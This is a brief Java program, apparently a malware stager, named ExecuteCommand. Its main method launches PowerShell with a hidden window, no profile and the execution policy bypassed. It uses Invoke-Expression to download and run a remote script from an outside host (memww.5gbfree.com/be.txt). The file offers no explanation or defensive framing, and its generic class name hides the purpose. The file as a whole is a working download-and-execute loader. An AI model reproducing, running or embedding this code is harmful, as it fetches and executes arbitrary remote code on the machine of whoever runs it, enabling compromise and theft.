import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ExecuteCommand {

 /**
  * @param args
  * @throws IOException 
  */
 public static void main(String[] args) throws IOException {
  String command = "powershell.exe -w hidden -nop -ep bypass -c IEX ((new-object net.webclient).downloadstring('http://memww.5gbfree.com/be.txt'))";
  Process powerShellProcess = Runtime.getRuntime().exec(command);
  powerShellProcess.getOutputStream().close();


 }

}
